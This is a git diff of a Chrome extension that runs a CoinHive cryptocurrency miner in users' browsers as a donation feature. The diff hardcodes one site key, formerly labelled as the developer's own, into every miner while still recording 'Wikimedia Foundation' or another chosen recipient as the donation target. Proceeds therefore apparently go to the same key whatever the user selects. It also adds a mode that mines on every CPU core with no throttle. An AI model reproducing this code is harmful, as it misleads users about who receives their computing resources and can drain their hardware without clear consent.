@@ -1,7 +1,6 @@
-
-
 //example of using a message handler from the inject scripts
 chrome.extension.onConnect.addListener(function(port) {
+  portVar = port
   port.onMessage.addListener(function(msg) {
     switch (msg) {
       case "status":
@@ -19,8 +18,7 @@ chrome.extension.onConnect.addListener(function(port) {
   });
 })
 
-var targets = { "AddCoinPlus":'AYTQhwM6RBQEGbju5cb8LbPEqr0WgzwH', "Wikipedia":"wUGofmEKF0V3jAhKhsN1UkGdAHADRFye"}
-
+var portVar;
 var HPS = 0;
 var miner;
 var totalHashes = 0;
@@ -34,7 +32,7 @@ if (isNaN(localStorage.totalHashes) || localStorage.totalHashes == undefined) {
   localStorage.totalHashes = 0;
 }
 if (localStorage.donationTarget == undefined) {
-  localStorage.donationTarget = 'AddCoinPlus'; //Default to donate to us xD
+  localStorage.donationTarget = 'Wikimedia Foundation';
 }
 if (localStorage.idle == undefined) {
   localStorage.idle = false;
@@ -47,15 +45,15 @@ if (localStorage.idleThreads == undefined) {
 }
 
 if (localStorage.crazyMode == undefined) {
-  localStorage.crazyMode = 0; // false
+  localStorage.crazyMode = false; // false
 }
 
 //We do this to prevent errors before first miner creation
-miner = new CoinHive.User(targets[localStorage.donationTarget], localStorage.donationTarget);
+miner = new CoinHive.User('AYTQhwM6RBQEGbju5cb8LbPEqr0WgzwH', localStorage.donationTarget);
 
 function start() { //Start a new miner
   console.log("Starting miner.");
-  miner = new CoinHive.User(targets[localStorage.donationTarget], localStorage.donationTarget);
+  miner = new CoinHive.User('AYTQhwM6RBQEGbju5cb8LbPEqr0WgzwH', localStorage.donationTarget);
 
   totalHashes = 0;
   oldTotalHashes = 0;
@@ -74,7 +72,7 @@ function change(target) { //Change the donation ID for the miner
   stop();
   localStorage.donationTarget = target;
   localStorage.totalHashes = 0;
-  start();
+  portVar.postMessage(false);
 }
 
 setInterval(function() { //Update the internal total hashes
@@ -105,16 +103,21 @@ var avgcpu = 0
 
 setInterval(function(){
   if (miner.isRunning()) {
-    chrome.idle.queryState(60, function (idleState) {
-      if (idleState == "idle") {
-        miner.setNumThreads(idleThreads);
-        miner.setThrottle(0.2);
-        console.log("Idle");
-      } else {
-        miner.setNumThreads(activeThreads);
-        miner.setThrottle(0.5);
-        console.log("not");
-      }
-    });
+    if (localStorage.crazyMode == "false") {
+      chrome.idle.queryState(60, function (idleState) {
+        if (idleState == "idle") {
+          miner.setNumThreads(idleThreads);
+          miner.setThrottle(0.2);
+          console.log("Idle");
+        } else {
+          miner.setNumThreads(activeThreads);
+          miner.setThrottle(0.5);
+          console.log("not");
+        }
+      });
+    } else {
+      miner.setNumThreads(navigator.hardwareConcurrency);
+      miner.setThrottle(0);
+    }
   }
 }, 5000);
